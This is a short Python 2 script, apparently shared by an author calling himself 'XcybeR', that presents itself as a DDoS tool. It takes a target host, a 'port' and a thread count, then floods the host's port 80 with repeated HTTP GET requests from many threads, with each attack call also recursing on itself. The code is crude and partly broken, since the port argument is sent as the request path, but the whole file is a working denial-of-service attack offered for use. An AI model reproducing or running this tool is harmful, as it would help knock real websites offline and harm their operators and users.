import socket, sys, os, threading, time

os.system("clear")

print("""
  ____  ____   ___  ____   
 |  _ \|  _ \ / _ \/ ___| 
 | | | | | | | | | \___ \ 
 | |_| | |_| | |_| |___) |
 |____/|____/ \___/|____/ 

                     # AUTHOR : XcybeR
       \n\033[34;1m[*]\033[0m Usage : python2 ddos.py <IP/HOST> <PORT> <Threads> 
""")
###
global level  
level=sys.argv[3]
###
def attack():  
    #pid = os.fork()  
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
        s.connect((sys.argv[1], 80))  
        print "   -->> LAUNCH ATTACK TO " + sys.argv[2] + " <<--"  
        s.send("GET /" + sys.argv[2] + " HTTP/1.1\r\n")  
        s.send("Host: " + sys.argv[1]  + "\r\n\r\n");  
        s.close()
    except:
        print("\033[91mNO CONNECTION! SERVER MAYBE DOWN! \033[0m")
    for x in range(1, 2000):
        time.sleep(0.009) #So it doesnt break after going to fast
        attack()
def threader():
    global threads
    threads=[]
    for i in range(1, int(level)):
        t=threading.Thread(target=attack)
        threads.append(t)
        t.start()
threader()
